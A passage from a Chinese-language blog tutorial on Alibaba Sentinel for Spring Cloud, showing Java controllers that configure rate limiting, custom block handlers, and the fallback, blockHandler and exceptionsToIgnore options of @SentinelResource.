class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RateLimitController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/rateLimit/byUrl"</span>)</span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"byUrl"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">byUrl</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"按url限流测试OK"</span>,<span class="keyword">new</span> Payment(<span class="number">2020L</span>,<span class="string">"serial002"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Sentinel控制台配置</strong></p><p><img src="../img/sentinel/sentinel30.png" alt=""></p><p><strong>测试</strong></p><ul><li>快速点击<a href="http://localhost:8401/rateLimit/byUrl" target="_blank" rel="noopener">http://localhost:8401/rateLimit/byUrl</a></li><li>结果 - 会返回Sentinel自带的限流处理结果 Blocked by Sentinel (flow limiting)</li></ul><p><strong>上面兜底方案面临的问题</strong></p><ol><li><p>系统默认的，没有体现我们自己的业务要求。</p></li><li><p>依照现有条件，我们自定义的处理方法又和业务代码耦合在一块，不直观。</p></li><li><p>每个业务方法都添加—个兜底的，那代码膨胀加剧。</p></li><li><p>全局统—的处理方法没有体现。</p></li></ol><p>即将兜底方案抽出来封装成一个单独的类。</p><p>客户自定义限流处理逻辑</p><p>自定义限流处理类 - 创建CustomerBlockHandler类用于自定义限流处理逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.csp.sentinel.slots.block.BlockException;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.CommonResult;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.Payment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomerBlockHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CommonResult <span class="title">handlerException</span><span class="params">(BlockException exception)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">4444</span>,<span class="string">"按客戶自定义,global handlerException----1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CommonResult <span class="title">handlerException2</span><span class="params">(BlockException exception)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">4444</span>,<span class="string">"按客戶自定义,global handlerException----2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RateLimitController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RateLimitController</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/rateLimit/customerBlockHandler"</span>)</span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"customerBlockHandler"</span>,</span><br><span class="line">            blockHandlerClass = CustomerBlockHandler<span class="class">.<span class="keyword">class</span>,//&lt;-------- 自定义限流处理类</span></span><br><span class="line"><span class="class">            <span class="title">blockHandler</span> </span>= <span class="string">"handlerException2"</span>)<span class="comment">//&lt;-----------</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">customerBlockHandler</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"按客戶自定义"</span>,<span class="keyword">new</span> Payment(<span class="number">2020L</span>,<span class="string">"serial003"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Sentinel控制台配置</p><p><img src="../img/sentinel/sentinel31.png" alt=""></p><p>启动微服务后先调用一次 - <a href="http://localhost:8401/rateLimit/customerBlockHandler。然后，多次快速刷新http://localhost:8401/rateLimit/customerBlockHandler。刷新后，我们自定义兜底方法的字符串信息就返回到前端。" target="_blank" rel="noopener">http://localhost:8401/rateLimit/customerBlockHandler。然后，多次快速刷新http://localhost:8401/rateLimit/customerBlockHandler。刷新后，我们自定义兜底方法的字符串信息就返回到前端。</a></p><h3 id="SentinelResource注解"><a href="#SentinelResource注解" class="headerlink" title="SentinelResource注解"></a>SentinelResource注解</h3><p>@SentinelResource 注解</p><p>注意：注解方式埋点不支持 private 方法。</p><p>@SentinelResource 用于定义资源，并提供可选的异常处理和 fallback 配置项。 @SentinelResource 注解包含以下属性：</p><ul><li><p>value：资源名称，必需项（不能为空）</p></li><li><p>entryType：entry 类型，可选项（默认为 EntryType.OUT）</p></li><li>blockHandler / blockHandlerClass: blockHandler 对应处理 BlockException 的函数名称，可选项。blockHandler 函数访问范围需要是 public，返回类型需要与原方法相匹配，参数类型需要和原方法相匹配并且最后加一个额外的参数，类型为 BlockException。blockHandler 函数默认需要和原方法在同一个类中。若希望使用其他类的函数，则可以指定 blockHandlerClass 为对应的类的 Class 对象，注意对应的函数必需为 static 函数，否则无法解析。</li><li>fallback /fallbackClass：fallback 函数名称，可选项，用于在抛出异常的时候提供 fallback 处理逻辑。fallback 函数可以针对所有类型的异常（除了exceptionsToIgnore里面排除掉的异常类型）进行处理。fallback 函数签名和位置要求：<br>返回值类型必须与原函数返回值类型一致；<br>方法参数列表需要和原函数一致，或者可以额外多一个 Throwable 类型的参数用于接收对应的异常。<br>fallback 函数默认需要和原方法在同一个类中。若希望使用其他类的函数，则可以指定 fallbackClass 为对应的类的 Class 对象，注意对应的函数必需为 static 函数，否则无法解析。</li><li>defaultFallback（since 1.6.0）：默认的 fallback 函数名称，可选项，通常用于通用的 fallback 逻辑（即可以用于很多服务或方法）。默认 fallback 函数可以针对所有类型的异常（除了exceptionsToIgnore里面排除掉的异常类型）进行处理。若同时配置了 fallback 和 defaultFallback，则只有 fallback 会生效。defaultFallback 函数签名要求：<ul><li>返回值类型必须与原函数返回值类型一致；</li><li>方法参数列表需要为空，或者可以额外多一个 Throwable 类型的参数用于接收对应的异常。</li><li>defaultFallback 函数默认需要和原方法在同一个类中。若希望使用其他类的函数，则可以指定 fallbackClass 为对应的类的 Class 对象，注意对应的函数必需为 static 函数，否则无法解析。</li></ul></li><li>exceptionsToIgnore（since 1.6.0）：用于指定哪些异常被排除掉，不会计入异常统计中，也不会进入 fallback 逻辑中，而是会原样抛出。</li></ul><h3 id="blockHandler-与-fallback"><a href="#blockHandler-与-fallback" class="headerlink" title="blockHandler 与 fallback"></a>blockHandler 与 fallback</h3><ul><li>fallback管运行异常</li><li>blockHandler管配置违规</li></ul><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.CommonResult;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.Payment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;server.port&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//模拟数据库</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Long,Payment&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        hashMap.put(<span class="number">1L</span>,<span class="keyword">new</span> Payment(<span class="number">1L</span>,<span class="string">"28a8c1e3bc2742d8848569891fb42181"</span>));</span><br><span class="line">        hashMap.put(<span class="number">2L</span>,<span class="keyword">new</span> Payment(<span class="number">2L</span>,<span class="string">"bba8c1e3bc2742d8848569891ac32182"</span>));</span><br><span class="line">        hashMap.put(<span class="number">3L</span>,<span class="keyword">new</span> Payment(<span class="number">3L</span>,<span class="string">"6ua8c1e3bc2742d8848569891xt92183"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/paymentSQL/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Long id)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Payment payment = hashMap.get(id);</span><br><span class="line">        CommonResult&lt;Payment&gt; result = <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"from mysql,serverPort:  "</span>+serverPort,payment);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.csp.sentinel.annotation.SentinelResource;</span><br><span class="line">import com.alibaba.csp.sentinel.slots.block.BlockException;</span><br><span class="line">import com.atguigu.springcloud.alibaba.service.PaymentService;</span><br><span class="line">import com.atguigu.springcloud.entities.CommonResult;</span><br><span class="line">import com.atguigu.springcloud.entities.Payment;</span><br><span class="line">import lombok.extern.slf4j.Slf4j;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line">import javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@Slf4j</span><br><span class="line">public class CircleBreakerController &#123;</span><br><span class="line">    public static final String SERVICE_URL &#x3D; &quot;http:&#x2F;&#x2F;sentinel-payment-provider&quot;;</span><br><span class="line"></span><br><span class="line">    @Resource</span><br><span class="line">    private RestTemplate restTemplate;</span><br><span class="line"> </span><br><span class="line">    @RequestMapping(&quot;&#x2F;consumer&#x2F;fallback&#x2F;&#123;id&#125;&quot;)</span><br><span class="line">    @SentinelResource(value &#x3D; &quot;fallback&quot;)&#x2F;&#x2F;没有配置</span><br><span class="line">    public CommonResult&lt;Payment&gt; fallback(@PathVariable Long id)</span><br><span class="line">    &#123;</span><br><span class="line">        CommonResult&lt;Payment&gt; result &#x3D; restTemplate.getForObject(SERVICE_URL + &quot;&#x2F;paymentSQL&#x2F;&quot;+id,CommonResult.class,id);</span><br><span class="line"></span><br><span class="line">        if (id &#x3D;&#x3D; 4) &#123;</span><br><span class="line">            throw new IllegalArgumentException (&quot;IllegalArgumentException,非法参数异常....&quot;);</span><br><span class="line">        &#125;else if (result.getData() &#x3D;&#x3D; null) &#123;</span><br><span class="line">            throw new NullPointerException (&quot;NullPointerException,该ID没有对应记录,空指针异常&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Sentinel服务熔断只配置fallback"><a href="#Sentinel服务熔断只配置fallback" class="headerlink" title="Sentinel服务熔断只配置fallback"></a>Sentinel服务熔断只配置fallback</h3><p>fallback只负责业务异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircleBreakerController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SERVICE_URL = <span class="string">"http://sentinel-payment-provider"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/consumer/fallback/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="comment">//@SentinelResource(value = "fallback")//没有配置</span></span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"fallback"</span>, fallback = <span class="string">"handlerFallback"</span>) <span class="comment">//fallback只负责业务异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">fallback</span><span class="params">(@PathVariable Long id)</span> </span>&#123;</span><br><span class="line">        CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + <span class="string">"/paymentSQL/"</span>+id,CommonResult<span class="class">.<span class="keyword">class</span>,<span class="title">id</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (id == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException (<span class="string">"IllegalArgumentException,非法参数异常...."</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (result.getData() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException (<span class="string">"NullPointerException,该ID没有对应记录,空指针异常"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//本例是fallback</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">handlerFallback</span><span class="params">(@PathVariable  Long id,Throwable e)</span> </span>&#123;</span><br><span class="line">        Payment payment = <span class="keyword">new</span> Payment(id,<span class="string">"null"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">444</span>,<span class="string">"兜底异常handlerFallback,exception内容  "</span>+e.getMessage(),payment);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试地址 - <a href="http://localhost:84/consumer/fallback/4" target="_blank" rel="noopener">http://localhost:84/consumer/fallback/4</a></p><p>页面返回结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:444,&quot;message&quot;:&quot;兜底异常nandlerFal1back, exception内容illegalkrgumentEBxceptiorn,非法参数异常……&quot;,&quot;data&quot;:&#123;&quot;id&quot;:4,&quot;seria:&quot;null&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Sentinel服务熔断只配置blockHandler"><a href="#Sentinel服务熔断只配置blockHandler" class="headerlink" title="Sentinel服务熔断只配置blockHandler"></a>Sentinel服务熔断只配置blockHandler</h3><p>blockHandler只负责<strong>sentinel控制台配置违规</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircleBreakerController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SERVICE_URL = <span class="string">"http://sentinel-payment-provider"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/consumer/fallback/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="comment">//@SentinelResource(value = "fallback") //没有配置</span></span><br><span class="line">    <span class="comment">//@SentinelResource(value = "fallback",fallback = "handlerFallback") //fallback只负责业务异常</span></span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"fallback"</span>,blockHandler = <span class="string">"blockHandler"</span>) <span class="comment">//blockHandler只负责sentinel控制台配置违规</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">fallback</span><span class="params">(@PathVariable Long id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + <span class="string">"/paymentSQL/"</span>+id,CommonResult<span class="class">.<span class="keyword">class</span>,<span class="title">id</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (id == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException (<span class="string">"IllegalArgumentException,非法参数异常...."</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (result.getData() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException (<span class="string">"NullPointerException,该ID没有对应记录,空指针异常"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//本例是fallback</span></span><br><span class="line"><span class="comment">/*    public CommonResult handlerFallback(@PathVariable  Long id,Throwable e) &#123;</span></span><br><span class="line"><span class="comment">        Payment payment = new Payment(id,"null");</span></span><br><span class="line"><span class="comment">        return new CommonResult&lt;&gt;(444,"兜底异常handlerFallback,exception内容  "+e.getMessage(),payment);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//本例是blockHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">blockHandler</span><span class="params">(@PathVariable  Long id,BlockException blockException)</span> </span>&#123;</span><br><span class="line">        Payment payment = <span class="keyword">new</span> Payment(id,<span class="string">"null"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">445</span>,<span class="string">"blockHandler-sentinel限流,无此流水: blockException  "</span>+blockException.getMessage(),payment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试地址 - <a href="http://localhost:84/consumer/fallback/4" target="_blank" rel="noopener">http://localhost:84/consumer/fallback/4</a></p><h3 id="Sentinel服务熔断fallback和blockHandler都配置"><a href="#Sentinel服务熔断fallback和blockHandler都配置" class="headerlink" title="Sentinel服务熔断fallback和blockHandler都配置"></a>Sentinel服务熔断fallback和blockHandler都配置</h3><p>若blockHandler和fallback 都进行了配置，则被限流降级而抛出BlockException时只会进入blockHandler处理逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircleBreakerController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SERVICE_URL = <span class="string">"http://sentinel-payment-provider"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/consumer/fallback/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="comment">//@SentinelResource(value = "fallback") //没有配置</span></span><br><span class="line">    <span class="comment">//@SentinelResource(value = "fallback",fallback = "handlerFallback") //fallback只负责业务异常</span></span><br><span class="line">    <span class="comment">//@SentinelResource(value = "fallback",blockHandler = "blockHandler") //blockHandler只负责sentinel控制台配置违规</span></span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"fallback"</span>,fallback = <span class="string">"handlerFallback"</span>,blockHandler = <span class="string">"blockHandler"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">fallback</span><span class="params">(@PathVariable Long id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + <span class="string">"/paymentSQL/"</span>+id,CommonResult<span class="class">.<span class="keyword">class</span>,<span class="title">id</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (id == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException (<span class="string">"IllegalArgumentException,非法参数异常...."</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (result.getData() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException (<span class="string">"NullPointerException,该ID没有对应记录,空指针异常"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//本例是fallback</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">handlerFallback</span><span class="params">(@PathVariable  Long id,Throwable e)</span> </span>&#123;</span><br><span class="line">        Payment payment = <span class="keyword">new</span> Payment(id,<span class="string">"null"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">444</span>,<span class="string">"兜底异常handlerFallback,exception内容  "</span>+e.getMessage(),payment);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//本例是blockHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">blockHandler</span><span class="params">(@PathVariable  Long id,BlockException blockException)</span> </span>&#123;</span><br><span class="line">        Payment payment = <span class="keyword">new</span> Payment(id,<span class="string">"null"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">445</span>,<span class="string">"blockHandler-sentinel限流,无此流水: blockException  "</span>+blockException.getMessage(),payment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Sentinel服务熔断exceptionsToIgnore"><a href="#Sentinel服务熔断exceptionsToIgnore" class="headerlink" title="Sentinel服务熔断exceptionsToIgnore"></a>Sentinel服务熔断exceptionsToIgnore</h3><p>exceptionsToIgnore，忽略指定异常，即这些异常不用兜底方法处理。开发本地排查错误用该注解取消兜底异常处理，排查错误。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircleBreakerController</span>    </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    ...</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line">    @RequestMapping("/consumer/fallback/&#123;id&#125;")</span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"fallback"</span>,fallback = <span class="string">"handlerFallback"</span>,blockHandler = <span class="string">"blockHandler"</span>,</span><br><span class="line">            exceptionsToIgnore = &#123;IllegalArgumentException<span class="class">.<span class="keyword">class</span>&#125;)//&lt;-------------</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">CommonResult</span>&lt;<span class="title">Payment</span>&gt; <span class="title">fallback</span>(@<span class="title">PathVariable</span> <span class="title">Long</span> <span 